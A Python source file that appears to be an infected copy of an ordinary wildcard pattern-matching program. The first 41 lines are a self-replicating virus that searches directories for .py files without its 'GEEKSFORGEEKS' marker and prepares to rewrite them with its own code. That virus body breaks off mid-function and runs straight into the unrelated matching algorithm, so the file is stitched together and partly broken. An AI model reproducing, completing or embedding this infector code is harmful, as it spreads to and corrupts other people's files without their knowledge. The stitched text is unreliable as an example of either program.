#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python program to implement wildcard
# pattern matching algorithm
 
# Function that matches input strr with
# given wildcard pattern
 
 
def strrmatch(strr, pattern, n, m):
 
    # empty pattern can only match with
    # empty string
    if (m == 0):
        return (n == 0)
 
    # lookup table for storing results of
    # subproblems
    lookup = [[False for i in range(m + 1)] for j in range(n + 1)]
 
    # empty pattern can match with empty string
    lookup[0][0] = True
 
    # Only '*' can match with empty string
    for j in range(1, m + 1):
        if (pattern[j - 1] == '*'):
            lookup[0][j] = lookup[0][j - 1]
 
    # fill the table in bottom-up fashion
    for i in range(1, n + 1):
        for j in range(1, m + 1):
 
            # Two cases if we see a '*'
            # a) We ignore ‘*’ character and move
            # to next character in the pattern,
            # i.e., ‘*’ indicates an empty sequence.
            # b) '*' character matches with ith
            # character in input
            if (pattern[j - 1] == '*'):
                lookup[i][j] = lookup[i][j - 1] or lookup[i - 1][j]
 
            # Current characters are considered as
            # matching in two cases
            # (a) current character of pattern is '?'
            # (b) characters actually match
            elif (pattern[j - 1] == '?' or strr[i - 1] == pattern[j - 1]):
                lookup[i][j] = lookup[i - 1][j - 1]
 
            # If characters don't match
            else:
                lookup[i][j] = False
 
    return lookup[n][m]
 
# Driver code
 
 
strr = "baaabab"
pattern = "*****ba*****ab"
# char pattern[] = "ba*****ab"
# char pattern[] = "ba*ab"
# char pattern[] = "a*ab"
# char pattern[] = "a*****ab"
# char pattern[] = "*a*****ab"
# char pattern[] = "ba*ab****"
# char pattern[] = "****"
# char pattern[] = "*"
# char pattern[] = "aa?ab"
# char pattern[] = "b*b"
# char pattern[] = "a*a"
# char pattern[] = "baaabab"
# char pattern[] = "?baaabab"
# char pattern[] = "*baaaba*"
 
if (strrmatch(strr, pattern, len(strr), len(pattern))):
    print("Yes")
else:
    print("No")
 
# This code is contributed by shubhamsingh10